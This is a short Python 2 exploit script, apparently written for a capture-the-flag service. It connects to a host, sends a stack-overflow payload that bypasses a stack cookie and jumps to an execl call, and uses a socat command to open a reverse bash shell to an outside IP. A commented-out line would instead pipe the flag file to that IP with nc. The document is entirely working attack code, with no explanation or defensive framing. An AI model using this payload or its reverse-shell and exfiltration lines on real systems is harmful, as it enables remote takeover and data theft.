#!/usr/bin/env python2
#-*- coding:utf-8 -*-
from zio import *
import time

ip = '10.211.55.48'
port = 8888
cookie = 0x8f64a000
saved_ebp = 0xffb49c68

io = zio((ip, port), timeout = 1000, print_write = COLORED(REPR))
time.sleep(2)
io.read_until('>')
io.write('4')
io.read_until('(y/n) ')

ret_address = 0x8048C79 #call execl
binsh = 0x804970D
sh = 0x804970A
_c = saved_ebp - 20
command = _c + 4

#110bytes
payload = "A"*10 + l32(cookie) + l32(0) + l32(0) +\
            l32(saved_ebp) + l32(ret_address) +\
            l32(binsh) + l32(sh) + l32(_c) +\
            l32(command) + l32(0) +\
            "-c\x00\x00" +\
            "socat tcp-connect:182.92.15.17:9988 exec:'bash -li'" + "\x00"
            #"cat flag | nc 182.92.15.17 9988" + "\x00"

io.write(payload)
#io.interact()
